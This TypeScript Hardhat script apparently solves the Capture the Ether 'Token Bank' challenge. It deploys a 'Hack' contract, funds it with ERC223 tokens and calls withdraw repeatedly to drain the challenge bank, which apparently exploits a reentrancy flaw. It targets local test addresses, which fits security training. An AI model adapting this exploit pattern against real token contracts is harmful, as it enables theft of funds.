import "@typechain/hardhat";
import "@nomiclabs/hardhat-ethers";
import { ethers } from "hardhat";
import CoActTokenABI from "../artifacts/contracts/tokenBank.sol/TokenBankChallenge.json";
import tokenABI from "../artifacts/contracts/tokenBank.sol/SimpleERC223Token.json";
import {
  hackSol,
  Hack__factory,
  SimpleERC223Token,
  TokenBankChallenge,
} from "../artifacts/contracts/types";
const CONTRACT_ADDRESS = "0x5FbDB2315678afecb367f032d93F642f64180aa3";
const TOKEN_ADDRESS = "0xa16E02E87b7454126E5E10d957A927A7F5B5d2be";
const deploy = async () => {
  const Hack = await ethers.getContractFactory("Hack");
  const hack = await Hack.deploy();
  console.log("Contract deployed to:", hack.address);
  const contract = new ethers.Contract(
    CONTRACT_ADDRESS,
    CoActTokenABI.abi,
    await ethers.getSigner("0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266")
  ) as TokenBankChallenge;
  const token = new ethers.Contract(
    TOKEN_ADDRESS,
    tokenABI.abi,
    await ethers.getSigner("0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266")
  ) as SimpleERC223Token;
  console.log("NAME", await token.name());
  await hack.setERC223Contract(TOKEN_ADDRESS);
  await token["transfer(address,uint256)"](
    hack.address,
    BigInt(500000 * 10 ** 18)
  );
  await hack.withdraw(BigInt(500000 * 10 ** 18));
  await contract.withdraw(BigInt(500000 * 10 ** 18));
  // await hack.auth({ gasLimit: 100000 });*/
};

deploy()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
